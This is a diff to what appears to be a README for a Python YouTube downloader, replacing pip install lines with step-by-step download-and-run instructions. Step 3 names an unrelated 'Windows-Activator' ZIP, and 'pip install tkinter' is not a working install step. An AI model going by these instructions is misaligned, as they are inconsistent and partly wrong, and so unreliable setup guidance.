@@ -5,8 +5,12 @@
 
 **Installation:**
 
-```
-pip install pytube
-pip install pydub
-pip install tkinter
-```
+1. Click on `Code`
+2. Click `Download ZIP`
+3. Extract `WINTO10-Windows-Activator-main.zip`
+4. Open the folder
+5. Open CMD in that folder
+6. Type `pip install pytube`
+7. Type `pip install pydub`
+8. Type `pip install tkinter`
+9. Run `YT_Downloader.py`
